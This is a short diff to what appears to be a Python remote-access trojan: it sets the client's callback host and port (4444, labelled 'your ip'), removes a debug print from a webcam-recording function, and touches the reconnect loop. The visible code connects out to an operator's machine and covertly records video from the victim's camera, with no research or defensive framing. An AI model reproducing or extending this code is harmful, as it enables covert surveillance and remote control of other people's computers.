@@ -17,10 +17,8 @@ def socket_create():
 		global host
 		global port
 		global s
-		host = '193.161.193.99' # your ip
-		port = 57492
-		#host = '192.168.43.101' # your ip
-		#port = 4278
+		host = '192.168.31.38' # your ip
+		port = 4444 # your port
 		s = socket.socket()
 	except socket.error as msg:
 		print("Socket creation error: " + str(msg))
@@ -341,7 +339,6 @@ def video_record(cmd):
 			ret, frame = cap.read() 
 			gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY) 
 			out.write(frame) 
-			print(x)
 			time.sleep(0.00001)
 
 		cap.release() 
@@ -393,4 +390,4 @@ def main():
 		time.sleep(3)
 	s.close()
 	main()
-main() 
+main()
